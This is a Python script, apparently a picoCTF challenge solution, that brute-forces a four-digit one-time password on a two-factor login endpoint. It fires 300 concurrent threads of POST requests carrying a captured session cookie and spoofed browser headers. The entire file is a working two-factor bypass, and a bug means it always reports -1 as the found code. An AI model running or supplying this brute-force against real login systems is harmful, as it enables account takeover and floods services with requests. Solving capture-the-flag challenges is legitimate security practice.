import requests
import time 
from concurrent.futures import ThreadPoolExecutor

idd=59289
known=0

url = f"http://foggy-cliff.picoctf.net:{idd}/two_fa"

# Datos del formulario extraídos del cuerpo del request (otp=1234&action=)
payload = {
    "otp": "1234",
    "action": ""
}

# La cookie de sesión que autentica la petición
cookies = {
    "session": ".eJwty0sKgCAQANC7zFoiP2V6mRhyEsEfaqvo7rVo--DdEIv35MDCibETMCij7p2ORuNDoTn_bYREfWCqYLnetJSrMnxSy6yVEQyuTi1joi-hSyHD8wJFFhxe.aoiXKw.5XB7DAVsvxV9z17i4D73j2HO1jA"
}
start = time.time()

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Origin": f"http://foggy-cliff.picoctf.net:{idd}/",
    "Referer": f"http://foggy-cliff.picoctf.net:{idd}/two_fa"
}

INICIO = 1000
FIN = 10000
NUM_WORKERS = 300
MAX_REINTENTOS = 7
res = -1

def ejecutar_trabajo(parametro):
    for intento in range(1, MAX_REINTENTOS + 1):
        try:
            payload={"otp": str(parametro), "action": ""}
            # tu operación aquí
            respuesta = requests.post(url, data=payload, cookies=cookies, headers=headers)
            if parametro == known or "Invalid OTP or OTP expired" not in respuesta.text:
                print("-----------------------------------------------------------------------")
                print(f"[+] {parametro} {"-"*100}")
                res=parametro
                print(respuesta.text)
                break
                
            return True

        except requests.exceptions.ConnectionError as e:
            print(
                f"[!] {parametro}: conexión fallida "
                f"(intento {intento}/{MAX_REINTENTOS})",
                flush=True
            )

            if intento < MAX_REINTENTOS:
                time.sleep(0.5)
            else:
                print(f"[!] {parametro}: agotó los reintentos", flush=True)
                return False


def trabajador(worker_id):
    for parametro in range(INICIO + worker_id, FIN, NUM_WORKERS):
        ejecutar_trabajo(parametro)


with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
    list(executor.map(trabajador, range(NUM_WORKERS)))
    
print(f"encontrado: {res}")
